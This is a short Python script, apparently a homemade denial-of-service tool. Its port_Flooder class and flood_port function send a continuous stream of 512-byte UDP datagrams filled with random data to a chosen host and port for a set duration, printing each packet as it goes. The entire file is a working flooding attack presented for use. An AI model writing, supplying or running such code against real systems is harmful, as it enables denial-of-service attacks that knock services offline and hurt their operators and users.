import socket
import os
import time
import multiprocessing
import random

class port_Flooder(multiprocessing.process.BaseProcess):
    
    def __init__(self, host, port, time):
        print("Class Instantiated")
        #print("Class Instantiated")
        tmphost = host #Host (Constant)
        tmpport = port #Port (Dynamic)
        tmpflood_time = time #Flood Time (Constant)
        self.run(tmphost, tmpport, tmpflood_time)

    def run(self, *args_tmp):
        print("run")
        flood_port(*args_tmp)

def flood_port(*args):
    tmphost = args[0]
    tmpport = args[1]
    tmpflood_time = args[2]
    print(str(args))

    print("TEST")
    print("Flooding Port "+str(tmpport)+" Using PID "+str(os.getpid()))
    current_count = 0
    temp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    random_data = bytes(random._urandom(512))
    print(time.time())
    print(tmpflood_time)
    stop_time = int(time.time()) + int(tmpflood_time)
    print(stop_time)
    msg = 0
    while True:
        if ((stop_time) < (time.time())): #or (current_count > 30): #Artificial Break
            break
        else:
            pass
        print("Datagram "+str(msg)+" Sent to "+tmphost+" on Port "+str(tmpport))
        msg = msg + 1
        temp_socket.sendto(random_data, (tmphost, int(tmpport)))
        current_count = current_count + 1




